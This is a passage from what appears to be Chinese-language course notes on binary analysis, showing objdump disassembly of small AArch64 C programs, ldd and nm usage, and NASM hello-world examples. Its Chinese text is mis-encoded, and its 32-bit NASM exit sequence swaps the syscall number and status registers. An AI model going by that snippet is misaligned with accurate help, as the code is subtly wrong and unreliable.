 6c8:    b0000081     adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 6cc:    91004021     add    x1, x1, #0x10
 6d0:    cb000021     sub    x1, x1, x0
 6d4:    d37ffc22     lsr    x2, x1, #63
 6d8:    8b810c41     add    x1, x2, x1, asr #3
 6dc:    9341fc21     asr    x1, x1, #1
 6e0:    b40000c1     cbz    x1, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6e4:    90000082     adrp    x2, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6e8:    f947fc42     ldr    x2, [x2, #4088]
 6ec:    b4000062     cbz    x2, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6f0:    aa0203f0     mov    x16, x2
 6f4:    d61f0200     br    x16
 6f8:    d65f03c0     ret
 6fc:    d503201f     nop

0000000000000700 &amp;lt;__do_global_dtors_aux&amp;gt;:
 700:    a9be7bfd     stp    x29, x30, [sp, #-32]!
 704:    910003fd     mov    x29, sp
 708:    f9000bf3     str    x19, [sp, #16]
 70c:    b0000093     adrp    x19, 11000 &amp;lt;__data_start&amp;gt;
 710:    39404260     ldrb    w0, [x19, #16]
 714:    35000140     cbnz    w0, 73c &amp;lt;__do_global_dtors_aux+0x3c&amp;gt;
 718:    90000080     adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 71c:    f947f000     ldr    x0, [x0, #4064]
 720:    b4000080     cbz    x0, 730 &amp;lt;__do_global_dtors_aux+0x30&amp;gt;
 724:    b0000080     adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 728:    f9400400     ldr    x0, [x0, #8]
 72c:    97ffffb5     bl    600 &amp;lt;__cxa_finalize@plt&amp;gt;
 730:    97ffffd8     bl    690 &amp;lt;deregister_tm_clones&amp;gt;
 734:    52800020     mov    w0, #0x1                       // #1
 738:    39004260     strb    w0, [x19, #16]
 73c:    f9400bf3     ldr    x19, [sp, #16]
 740:    a8c27bfd     ldp    x29, x30, [sp], #32
 744:    d65f03c0     ret
 748:    d503201f     nop
 74c:    d503201f     nop

0000000000000750 &amp;lt;frame_dummy&amp;gt;:
 750:    17ffffdc     b    6c0 &amp;lt;register_tm_clones&amp;gt;

0000000000000754 &amp;lt;main&amp;gt;:
//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int main(){
 754:    a9bf7bfd     stp    x29, x30, [sp, #-16]!
 758:    910003fd     mov    x29, sp
   printf(&amp;quot;Wu YiHung\n&amp;quot;);
 75c:    90000000     adrp    x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 760:    911e4000     add    x0, x0, #0x790
 764:    97ffffb3     bl    630 &amp;lt;puts@plt&amp;gt;
   return 0;
 768:    52800000     mov    w0, #0x0                       // #0
}
 76c:    a8c17bfd     ldp    x29, x30, [sp], #16
 770:    d65f03c0     ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø5 ==&amp;gt; &lt;code&gt;objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÁµêÊûú5&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;yih@yih:~/Documents/C$ objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn

PLAYGROUND:     file format elf64-littleaarch64

Disassembly of section .text:

0000000000000640 &amp;lt;_start&amp;gt;:
 640:    objdump: unrecognised disassembler option: intel
nop
 644:    mov    x29, #0x0                       // #0
 648:    mov    x30, #0x0                       // #0
 64c:    mov    x5, x0
 650:    ldr    x1, [sp]
 654:    add    x2, sp, #0x8
 658:    mov    x6, sp
 65c:    adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 660:    ldr    x0, [x0, #4080]
 664:    mov    x3, #0x0                       // #0
 668:    mov    x4, #0x0                       // #0
 66c:    bl    5f0 &amp;lt;__libc_start_main@plt&amp;gt;
 670:    bl    620 &amp;lt;abort@plt&amp;gt;

0000000000000674 &amp;lt;call_weak_fn&amp;gt;:
 674:    adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 678:    ldr    x0, [x0, #4072]
 67c:    cbz    x0, 684 &amp;lt;call_weak_fn+0x10&amp;gt;
 680:    b    610 &amp;lt;__gmon_start__@plt&amp;gt;
 684:    ret
 688:    nop
 68c:    nop

0000000000000690 &amp;lt;deregister_tm_clones&amp;gt;:
 690:    adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 694:    add    x0, x0, #0x10
 698:    adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 69c:    add    x1, x1, #0x10
 6a0:    cmp    x1, x0
 6a4:    b.eq    6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;  // b.none
 6a8:    adrp    x1, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6ac:    ldr    x1, [x1, #4056]
 6b0:    cbz    x1, 6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;
 6b4:    mov    x16, x1
 6b8:    br    x16
 6bc:    ret

00000000000006c0 &amp;lt;register_tm_clones&amp;gt;:
 6c0:    adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 6c4:    add    x0, x0, #0x10
 6c8:    adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 6cc:    add    x1, x1, #0x10
 6d0:    sub    x1, x1, x0
 6d4:    lsr    x2, x1, #63
 6d8:    add    x1, x2, x1, asr #3
 6dc:    asr    x1, x1, #1
 6e0:    cbz    x1, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6e4:    adrp    x2, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 6e8:    ldr    x2, [x2, #4088]
 6ec:    cbz    x2, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6f0:    mov    x16, x2
 6f4:    br    x16
 6f8:    ret
 6fc:    nop

0000000000000700 &amp;lt;__do_global_dtors_aux&amp;gt;:
 700:    stp    x29, x30, [sp, #-32]!
 704:    mov    x29, sp
 708:    str    x19, [sp, #16]
 70c:    adrp    x19, 11000 &amp;lt;__data_start&amp;gt;
 710:    ldrb    w0, [x19, #16]
 714:    cbnz    w0, 73c &amp;lt;__do_global_dtors_aux+0x3c&amp;gt;
 718:    adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf780&amp;gt;
 71c:    ldr    x0, [x0, #4064]
 720:    cbz    x0, 730 &amp;lt;__do_global_dtors_aux+0x30&amp;gt;
 724:    adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 728:    ldr    x0, [x0, #8]
 72c:    bl    600 &amp;lt;__cxa_finalize@plt&amp;gt;
 730:    bl    690 &amp;lt;deregister_tm_clones&amp;gt;
 734:    mov    w0, #0x1                       // #1
 738:    strb    w0, [x19, #16]
 73c:    ldr    x19, [sp, #16]
 740:    ldp    x29, x30, [sp], #32
 744:    ret
 748:    nop
 74c:    nop

0000000000000750 &amp;lt;frame_dummy&amp;gt;:
 750:    b    6c0 &amp;lt;register_tm_clones&amp;gt;

0000000000000754 &amp;lt;main&amp;gt;:
//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int main(){
 754:    stp    x29, x30, [sp, #-16]!
 758:    mov    x29, sp
   printf(&amp;quot;Wu YiHung\n&amp;quot;);
 75c:    adrp    x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 760:    add    x0, x0, #0x790
 764:    bl    630 &amp;lt;puts@plt&amp;gt;
   return 0;
 768:    mov    w0, #0x0                       // #0
}
 76c:    ldp    x29, x30, [sp], #16
 770:    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;‰∏çÈ°ØÁ§∫Ê©üÂô®Êåá‰ª§ ==&amp;gt; --no-show-raw-insn&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3&gt;ÁØÑ‰æã2&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÂéüÂßãÁ¢º PLAYGROUND.c&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int f(int x, int y){
  int sum = 0;
  sum += x;
  sum += y;
  return sum;
}
int main(){
  int a = 128, b = 64;
  printf(&amp;quot;%d\n&amp;quot;,f(a, b));
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Á∑®Ë≠Ø &lt;code&gt;gcc -o PLAYGROUND PLAYGROUND.c -g&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø(‰ΩøÁî®intelÊ†ºÂºè) ==&amp;gt; &lt;code&gt;objdump -D -M intel PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yih-0118/ProgSec/blob/05261f54d4b97292ab5e00a3b7fd3bdc0a5d48c2/2-4_objdump_1.md&quot;&gt;ÁµêÊûú&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø(‰ΩøÁî®intelÊ†ºÂºè+ Âè™Ë¶ÅÂü∑Ë°åÂçÄÊÆµ.text) ==&amp;gt; &lt;code&gt;objdump -D -M intel -j .text PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yih-0118/ProgSec/blob/b1c2caf3faf44407e52fa20381cc156c33cf7301/2-4_objdump_2.md&quot;&gt;ÁµêÊûú&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø ==&amp;gt; &lt;code&gt;objdump -D -M intel -j .text PLAYGROUND --no-show-raw-insn&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yih-0118/ProgSec/blob/48d9f6017d51d3ce53f4f33bf4a03afd051c97e6/2-4_objdump_3.md&quot;&gt;ÁµêÊûú&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂèçÁ∑®Ë≠Ø ==&amp;gt; &lt;code&gt;objdump -S -M intel -j .text PLAYGROUND --no-show-raw-insn&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/yih-0118/ProgSec/blob/bd280f4fd86cfb8a099602025e49d17c8fd308ba/2-4_objdump_4.md&quot;&gt;ÁµêÊûú&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;PLAYGROUND:     file format elf64-littleaarch64

Disassembly of section .text:

0000000000000640 &amp;lt;_start&amp;gt;:
 640:    objdump: unrecognised disassembler option: intel
nop
 644:    mov    x29, #0x0                       // #0
 648:    mov    x30, #0x0                       // #0
 64c:    mov    x5, x0
 650:    ldr    x1, [sp]
 654:    add    x2, sp, #0x8
 658:    mov    x6, sp
 65c:    adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf708&amp;gt;
 660:    ldr    x0, [x0, #4080]
 664:    mov    x3, #0x0                       // #0
 668:    mov    x4, #0x0                       // #0
 66c:    bl    5f0 &amp;lt;__libc_start_main@plt&amp;gt;
 670:    bl    620 &amp;lt;abort@plt&amp;gt;

0000000000000674 &amp;lt;call_weak_fn&amp;gt;:
 674:    adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf708&amp;gt;
 678:    ldr    x0, [x0, #4072]
 67c:    cbz    x0, 684 &amp;lt;call_weak_fn+0x10&amp;gt;
 680:    b    610 &amp;lt;__gmon_start__@plt&amp;gt;
 684:    ret
 688:    nop
 68c:    nop

0000000000000690 &amp;lt;deregister_tm_clones&amp;gt;:
 690:    adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 694:    add    x0, x0, #0x10
 698:    adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 69c:    add    x1, x1, #0x10
 6a0:    cmp    x1, x0
 6a4:    b.eq    6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;  // b.none
 6a8:    adrp    x1, 10000 &amp;lt;__FRAME_END__+0xf708&amp;gt;
 6ac:    ldr    x1, [x1, #4056]
 6b0:    cbz    x1, 6bc &amp;lt;deregister_tm_clones+0x2c&amp;gt;
 6b4:    mov    x16, x1
 6b8:    br    x16
 6bc:    ret

00000000000006c0 &amp;lt;register_tm_clones&amp;gt;:
 6c0:    adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 6c4:    add    x0, x0, #0x10
 6c8:    adrp    x1, 11000 &amp;lt;__data_start&amp;gt;
 6cc:    add    x1, x1, #0x10
 6d0:    sub    x1, x1, x0
 6d4:    lsr    x2, x1, #63
 6d8:    add    x1, x2, x1, asr #3
 6dc:    asr    x1, x1, #1
 6e0:    cbz    x1, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6e4:    adrp    x2, 10000 &amp;lt;__FRAME_END__+0xf708&amp;gt;
 6e8:    ldr    x2, [x2, #4088]
 6ec:    cbz    x2, 6f8 &amp;lt;register_tm_clones+0x38&amp;gt;
 6f0:    mov    x16, x2
 6f4:    br    x16
 6f8:    ret
 6fc:    nop

0000000000000700 &amp;lt;__do_global_dtors_aux&amp;gt;:
 700:    stp    x29, x30, [sp, #-32]!
 704:    mov    x29, sp
 708:    str    x19, [sp, #16]
 70c:    adrp    x19, 11000 &amp;lt;__data_start&amp;gt;
 710:    ldrb    w0, [x19, #16]
 714:    cbnz    w0, 73c &amp;lt;__do_global_dtors_aux+0x3c&amp;gt;
 718:    adrp    x0, 10000 &amp;lt;__FRAME_END__+0xf708&amp;gt;
 71c:    ldr    x0, [x0, #4064]
 720:    cbz    x0, 730 &amp;lt;__do_global_dtors_aux+0x30&amp;gt;
 724:    adrp    x0, 11000 &amp;lt;__data_start&amp;gt;
 728:    ldr    x0, [x0, #8]
 72c:    bl    600 &amp;lt;__cxa_finalize@plt&amp;gt;
 730:    bl    690 &amp;lt;deregister_tm_clones&amp;gt;
 734:    mov    w0, #0x1                       // #1
 738:    strb    w0, [x19, #16]
 73c:    ldr    x19, [sp, #16]
 740:    ldp    x29, x30, [sp], #32
 744:    ret
 748:    nop
 74c:    nop

0000000000000750 &amp;lt;frame_dummy&amp;gt;:
 750:    b    6c0 &amp;lt;register_tm_clones&amp;gt;

0000000000000754 &amp;lt;f&amp;gt;:
//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int f(int x, int y){
 754:    sub    sp, sp, #0x20
 758:    str    w0, [sp, #12]
 75c:    str    w1, [sp, #8]
  int sum = 0;
 760:    str    wzr, [sp, #28]
  sum += x;
 764:    ldr    w1, [sp, #28]
 768:    ldr    w0, [sp, #12]
 76c:    add    w0, w1, w0
 770:    str    w0, [sp, #28]
  sum += y;
 774:    ldr    w1, [sp, #28]
 778:    ldr    w0, [sp, #8]
 77c:    add    w0, w1, w0
 780:    str    w0, [sp, #28]
  return sum;
 784:    ldr    w0, [sp, #28]
}
 788:    add    sp, sp, #0x20
 78c:    ret

0000000000000790 &amp;lt;main&amp;gt;:
int main(){
 790:    stp    x29, x30, [sp, #-32]!
 794:    mov    x29, sp
  int a = 128, b = 64;
 798:    mov    w0, #0x80                      // #128
 79c:    str    w0, [sp, #24]
 7a0:    mov    w0, #0x40                      // #64
 7a4:    str    w0, [sp, #28]
  printf(&amp;quot;%d\n&amp;quot;,f(a, b));
 7a8:    ldr    w1, [sp, #28]
 7ac:    ldr    w0, [sp, #24]
 7b0:    bl    754 &amp;lt;f&amp;gt;
 7b4:    mov    w1, w0
 7b8:    adrp    x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 7bc:    add    x0, x0, #0x7f0
 7c0:    bl    630 &amp;lt;printf@plt&amp;gt;
  return 0;
 7c4:    mov    w0, #0x0                       // #0
}
 7c8:    ldp    x29, x30, [sp], #32
 7cc:    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;Linux Âü∑Ë°åÊ™îÂàÜÊûêÂ∏∏Áî®Â∑•ÂÖ∑&lt;/h1&gt;
&lt;h2&gt;ldd Êåá‰ª§&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Áî®ÈÄî - ÂàóÂá∫ÂãïÊÖãÁõ∏‰æùÈóú‰øÇ„ÄÇ&lt;/li&gt;
&lt;li&gt;Ë™ûÊ≥ï &lt;code&gt;ldd FileName&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Á§∫ÁØÑ&lt;img src=&quot;https://hackmd.io/_uploads/SJObaIwqp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;nm Êåá‰ª§&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÂàóÂá∫ÁõÆÊ®ôÊ™îÊ°à(.o)ÁöÑÁ¨¶ËôüÊ∏ÖÂñÆ&lt;img src=&quot;https://hackmd.io/_uploads/rJbuZvv56.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Êü•Âà∞ÁöÑËß£ÈáãÊÑèÁæ©==&amp;gt;&lt;a href=&quot;https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/nm.html&quot;&gt;Âá∫Ëôï&lt;/a&gt;&lt;pre&gt;&lt;code&gt;-aÊàñ‚Äìdebug-symsÔºöÈ°ØÁ§∫ÊâÄÊúâÁöÑÁ¨¶ËôüÔºåÂåÖÊã¨debugger-only symbols„ÄÇ
-BÔºöÁ≠âÂêå‚ÄìformatxtbsdÔºåÁî®‰æÜÁõ∏ÂÆπMIPSÁöÑnm„ÄÇ
-CÊàñ‚ÄìdemangleÔºöÂ∞á‰ΩéÈöéÁ¨¶ËôüÂêçÁ®±Ëß£Êûê(demangle)Êàê‰ΩøÁî®ËÄÖÁ¥öÂêçÂ≠ó„ÄÇ ÈÄôÊ®£ÂèØ‰ª•‰ΩøÂæóC++ÂáΩÊï∏ÂêçÂÖ∑ÊúâÂèØËÆÄÊÄß„ÄÇ
‚Äìno-demangleÔºöÈ†êË®≠ÁöÑÈÅ∏È†ÖÔºå‰∏çÈúÄË¶ÅÂ∞á‰ΩéÈöéÁ¨¶ËôüÂêçÁ®±Ëß£ÊûêÊàê‰ΩøÁî®ËÄÖÁ¥öÂêç„ÄÇ
-DÊàñ‚ÄìdynamicÔºöÈ°ØÁ§∫ÂãïÊÖãÁ¨¶Ëôü„ÄÇ Ë©≤‰ªªÈÅ∏È†ÖÂÉÖÂ∞çÊñºÂãïÊÖãÁõÆÊ®ô(‰æãÂ¶ÇÁâπÂÆöÈ°ûÂûãÁöÑÂÖ±‰∫´Â∫´)ÊúâÊÑèÁæ©„ÄÇ
-f formatÔºö‰ΩøÁî®formatÊ†ºÂºèËº∏Âá∫„ÄÇ formatÂèØ‰ª•ÈÅ∏Âèñbsd„ÄÅsysvÊàñposixÔºåË©≤ÈÅ∏È†ÖÂú®GNUÁöÑnm‰∏≠ÊúâÁî®„ÄÇ È†êË®≠ÁÇ∫bsd„ÄÇ
-gÊàñ‚Äìextern-onlyÔºöÂÉÖÈ°ØÁ§∫Â§ñÈÉ®Á¨¶Ëôü„ÄÇ
-n„ÄÅ-vÊàñ‚Äìnumeric-sortÔºö‰æùÁ¨¶ËôüÂ∞çÊáâ‰ΩçÂùÄÁöÑÈ†ÜÂ∫èÊéíÂ∫èÔºåËÄåÈùûÊåâÁ¨¶ËôüÂêçÁ®±ÁöÑÂ≠óÂÖÉÈ†ÜÂ∫è„ÄÇ
-pÊàñ‚Äìno-sortÔºö‰æùÁõÆÊ®ôÊ™îÊ°à‰∏≠ÈÅáÂà∞ÁöÑÁ¨¶ËôüÈ†ÜÂ∫èÈ°ØÁ§∫Ôºå‰∏çÊéíÂ∫è„ÄÇ
-PÊàñ‚ÄìportabilityÔºö‰ΩøÁî®POSIX.2Ê®ôÊ∫ñËº∏Âá∫Ê†ºÂºèÂèñ‰ª£È†êË®≠ÁöÑËº∏Âá∫Ê†ºÂºè„ÄÇ Á≠âÂêåÊñº‰ΩøÁî®‰ªªÈÅ∏È†Ö-f posix„ÄÇ
-sÊàñ‚Äìprint-armapÔºöÁï∂ÂàóÂá∫Â∫´‰∏≠ÊàêÂì°ÁöÑÁ¨¶ËôüÊôÇÔºåÂåÖÂê´Á¥¢Âºï„ÄÇ Á¥¢ÂºïÁöÑÂÖßÂÆπÂåÖÂê´ÔºöÂì™‰∫õÊ®°ÁµÑÂåÖÂê´Âì™‰∫õÂêçÂ≠óÁöÑÂ∞çÊáâ„ÄÇ
-rÊàñ‚Äìreverse-sortÔºöÂèçËΩâÊéíÂ∫èÁöÑÈ†ÜÂ∫è(‰æãÂ¶ÇÔºåÂçáÂ∫èËÆäÊàêÈôçÂ∫è)„ÄÇ
‚Äìsize-sortÔºö‰æùÂ§ßÂ∞èÊéíÂàóÁ¨¶ËôüÈ†ÜÂ∫è„ÄÇ Ë©≤Â§ßÂ∞èÊòØÊåâÁÖß‰∏ÄÂÄãÁ¨¶ËôüÁöÑÂÄºËàáÂÆÉ‰∏ã‰∏ÄÂÄãÁ¨¶ËôüÁöÑÂÄºÈÄ≤Ë°åË®àÁÆóÁöÑ„ÄÇ
‚ÄìtargetxtbfdnameÔºöÊåáÂÆö‰∏ÄÂÄãÁõÆÊ®ô‰ª£Á¢ºÁöÑÊ†ºÂºèÔºåËÄåÈùû‰ΩøÁî®Á≥ªÁµ±ÁöÑÈ†êË®≠Ê†ºÂºè„ÄÇ
-uÊàñ‚Äìundefined-onlyÔºöÂÉÖÈ°ØÁ§∫Ê≤íÊúâÂÆöÁæ©ÁöÑÁ¨¶Ëôü(ÈÇ£‰∫õÂ§ñÈÉ®Á¨¶Ëôü)„ÄÇ
‚Äìdefined-only:ÂÉÖÈ°ØÁ§∫ÂÆöÁæ©ÁöÑÁ¨¶Ëôü„ÄÇ
-lÊàñ‚Äìline-numbersÔºöÂ∞çÊØèÂÄãÁ¨¶ËôüÔºå‰ΩøÁî®ÂÅµÈåØË≥áË®ä‰æÜË©¶ÂúñÊâæÂà∞Ê™îÊ°àÂêçÁ®±ÂíåË°åËôü„ÄÇ
-VÊàñ‚ÄìversionÔºöÈ°ØÁ§∫nmÁöÑÁâàÊú¨ËôüÁ¢º„ÄÇ
‚ÄìhelpÔºöÈ°ØÁ§∫nmÁöÑÈÅ∏È†Ö„ÄÇ
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;Ë®àÁÆóÊ©üÁµêÊßãËàáÁµÑÂêàÁ®ãÂºè&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;1.Ê©üÂô®Á¢º(machine code| instruction set)ËàáÁµÑÂêàÁ®ãÂºè(assembly program)&lt;/li&gt;
&lt;li&gt;2.Ë®àÁÆóÊ©üÁµêÊßã‰∏ªÈ°å&lt;/li&gt;
&lt;li&gt;3.ÁµÑÂêàË™ûË®ÄËàáÁ®ãÂºè&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Á∑ö‰∏äÂèçÁµÑË≠ØÊúçÂãô ==&amp;gt; &lt;a href=&quot;https://defuse.ca/online-x86-assembler.htm&quot;&gt;ÈÄ£Áµê&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Ê∏¨Ë©¶ÁØÑ‰æã: 55 8b ec Ê©üÂô®Á¢ºÁöÑÁµÑÂêàË™ûË®ÄÁÇ∫‰Ωï?&lt;/li&gt;
&lt;li&gt;ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/SyOOQPP5a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;NASM(Netwide Assembler)ÁµÑÂêàÁ®ãÂºèË®≠Ë®à&lt;/h1&gt;
&lt;h2&gt;NASM(Netwide Assembler)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÂÆòÊñπÊñá‰ª∂ &lt;a href=&quot;https://www.nasm.us/xdoc/2.15/html/&quot;&gt;https://www.nasm.us/xdoc/2.15/html/&lt;/a&gt;
&lt;a href=&quot;https://github.com/MyFirstSecurity2020/ProgSec/blob/main/3-3.md#nasm%E9%96%8B%E7%99%BC%E7%92%B0%E5%A2%831%E7%B7%9A%E4%B8%8A%E9%96%8B%E7%99%BC%E7%92%B0%E5%A2%83&quot;&gt; &lt;/a&gt;NASMÈñãÁôºÁí∞Â¢É1:Á∑ö‰∏äÈñãÁôºÁí∞Â¢É&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;myCompiler(64‰ΩçÂÖÉ) &lt;a href=&quot;https://www.mycompiler.io/new/asm-x86_64&quot;&gt;https://www.mycompiler.io/new/asm-x86_64&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;nasmÁ®ãÂºèÁØÑ‰æã&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÁØÑ‰æã:Ë≤ªÂºèÂ∫èÂàó:ÂàóÂç∞Âá∫90ÂÄãË≤ªÂºèÂ∫èÂàó&lt;ul&gt;
&lt;li&gt;Ë≥áÊñô‰æÜÊ∫ê:[&lt;a href=&quot;https://cs.lmu.edu/~ray/notes/nasmtutorial/%5D&quot;&gt;https://cs.lmu.edu/~ray/notes/nasmtutorial/]&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HkgY8d_96.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nasm -f elf64 PLAYGROUND.asm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gcc -o PLAYGROUND PLAYGROUND.o -no-pie&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;./PLAYGROUND&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;32‰ΩçÂÖÉNASMËàá64‰ΩçÂÖÉNASMÊØîËºÉ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÂéüÁ®ãÂºè&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
int main(){
  printf(&amp;quot;Yi-Hung Wu&amp;quot;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;32‰ΩçÂÖÉNASM&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;section .data
    msg db &amp;quot;Yi-Hung Wu&amp;quot;, 0

section .text
    global _start

_start:
    ; Call C library function to print the string
    push msg
    call printf

    ; Exit the program
    mov eax, 0       ; Return 0 status
    mov ebx, 0x1     ; Exit syscall number
    int 0x80         ; Call kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;64‰ΩçÂÖÉNASM&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;section .data
    message db &amp;quot;Yi-Hung Wu&amp;quot;, 10
    len equ $ - message

section .text
    global _start

_start:
    mov     rax, 1
    mov     rdi, 1
    mov     rsi, message
    mov     rdx, len
    syscall

    mov     rax, 60
    xor     rdi, rdi
    syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Áõ∏‰∫íÊØîËºÉËàáË™™Êòé&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ÂúàÂá∫‰∏çÂêå‰πãËôï&lt;img src=&quot;https://hackmd.io/_uploads/Hyits5pnp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hk-y3qp26.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;ÊïôÊùêÂ∞éËÆÄ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;GITHUB ==&amp;gt; &lt;a href=&quot;https://github.com/Apress/beginning-x64-assembly-programming/tree/master&quot;&gt;https://github.com/Apress/beginning-x64-assembly-programming/tree/master&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;git clone &lt;a href=&quot;https://github.com/Apress/beginning-x64-assembly-programming.git&quot;&gt;https://github.com/Apress/beginning-x64-assembly-programming.git&lt;/a&gt; &lt;img src=&quot;https://hackmd.io/_uploads/HyVGYdP9p.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÁµêÊûú
&lt;img src=&quot;https://hackmd.io/_uploads/Bkqov__q6.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Chapter 01&lt;/h3&gt;
&lt;ul&gt;
